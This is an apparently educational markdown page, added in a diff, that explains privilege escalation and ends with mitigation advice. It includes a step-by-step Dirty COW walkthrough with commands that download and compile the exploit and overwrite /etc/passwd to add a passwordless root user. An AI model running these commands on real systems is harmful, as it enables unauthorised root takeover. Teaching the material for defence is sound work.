@@ -1,0 +1,122 @@
+# Privilege Escalation
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> Privilege Escalation is the act of exploiting a bug, design flaw, or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. This access can be used by an attacker to infiltrate and take control of a system or a network.
+> 
+
+### 🧐 Why ?
+
+> Understanding Privilege Escalation is crucial because it is one of the key stages in most successful cyber-attacks. It allows an attacker, who has gained initial access, to transform that foothold into complete control of a system, data, or network. As such, it is a critical concept in cybersecurity, and its understanding can help in the creation of more secure systems and in the defense against cyber attacks.
+> 
+
+### ⛏️ How ?
+
+> Privilege Escalation can occur in two ways: horizontally, where a user gains the privileges of another user functioning at the same security level; or vertically, where an attacker escalates from a lower privilege to a higher one. The most common methods used for Privilege Escalation are: exploiting a system vulnerability, password cracking, social engineering, and privilege escalation through inheritance or trusted relationship.
+> 
+
+### ⏳ When ?
+
+> Privilege Escalation attacks have been in practice for as long as there have been systems with hierarchical privilege structures, which is to say, essentially since the creation of multi-user computing systems. However, these attacks have become more prevalent and sophisticated with the rise of the internet and the proliferation of interconnected systems.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+### Overview
+
+Privilege Escalation is a critical concept in cybersecurity where an attacker exploits system vulnerabilities to gain higher permissions than initially granted. This process involves identifying a target system, gaining initial access, and then elevating privileges within the system. Understanding Privilege Escalation is vital for designing secure systems and protecting against cyber attacks.
+
+### Types of Privilege Escalation
+
+1. **Horizontal Escalation**:
+    - The attacker gains the privileges of another user at the same security level.
+    - Example: An attacker compromises another regular user's account to access their data or resources.
+2. **Vertical Escalation**:
+    - The attacker elevates their privileges from a lower level to a higher one, becoming a superuser with full access rights.
+    - Example: An attacker uses a vulnerability to gain root access on a Linux system.
+
+### Methods of Privilege Escalation
+
+1. **Exploiting Known Vulnerabilities**:
+    - Using exploits for known vulnerabilities in the operating system or applications.
+2. **Password Cracking**:
+    - Guessing or cracking passwords to gain access to higher-privileged accounts.
+3. **Social Engineering**:
+    - Manipulating users into divulging sensitive information or performing actions that elevate privileges.
+4. **Exploiting Inheritance or Trusted Relationships**:
+    - Taking advantage of misconfigurations where privileges are inherited or where trusted relationships exist within the system's privilege structure.
+
+### Real Example: Privilege Escalation on a Linux System Using Dirty COW (CVE-2016-5195)
+
+### Scenario
+
+A Linux system running an old kernel version is vulnerable to the Dirty COW exploit, allowing a non-privileged user to gain write access to any file they can read. This can be used for Privilege Escalation.
+
+### Step-by-Step Process
+
+1. **Initial Access**:
+    - The attacker gains initial access through weak passwords or a phishing attack, obtaining non-privileged access.
+    - They identify the kernel version using the command:
+    
+    ```bash
+    uname -a
+    
+    ```
+    
+2. **Exploit Identification**:
+    - After confirming the system's vulnerability, the attacker uses the Dirty COW exploit.
+    - They download and compile the exploit code:
+    
+    ```bash
+    wget <https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c>
+    gcc -pthread dirtyc0w.c -o dirtyc0w
+    
+    ```
+    
+3. **Privilege Escalation**:
+    - The attacker targets a file they can read but not write, such as `/etc/passwd`.
+    - They use the exploit to modify the file and add a new root user:
+    
+    ```bash
+    ./dirtyc0w /etc/passwd "newroot::0:0:::/bin/bash"
+    
+    ```
+    
+4. **Post-Exploitation**:
+    - The attacker logs in as the new root user with the added credentials:
+    
+    ```bash
+    su - newroot
+    
+    ```
+    
+    - With root privileges, they have complete control over the system, allowing access to sensitive data, changes to system settings, or further attacks.
+
+### Mitigation Strategies
+
+1. **System Updates**:
+    - Regularly update and patch systems to fix known vulnerabilities.
+    - Use automated tools to ensure timely updates.
+2. **Strong and Unique Passwords**:
+    - Implement strong password policies and enforce the use of unique passwords.
+    - Utilize multi-factor authentication (MFA) where possible.
+3. **User Education**:
+    - Educate users about phishing attacks and social engineering tactics.
+    - Conduct regular security awareness training.
+4. **Least Privilege Principle**:
+    - Apply the principle of least privilege, ensuring users have the minimum necessary permissions.
+    - Regularly audit user permissions and access levels.
+5. **Monitoring and Detection**:
+    - Implement monitoring tools to detect unusual activities or potential exploits.
+    - Use intrusion detection systems (IDS) and intrusion prevention systems (IPS) to identify and respond to attacks.
+
+### Conclusion
+
+Privilege Escalation is a significant threat in cybersecurity, allowing attackers to gain elevated access and potentially control the entire system. By understanding the methods and implementing robust mitigation strategies, organizations can protect their systems from such attacks. Regular updates, strong passwords, user education, and continuous monitoring are key components of an effective security posture.
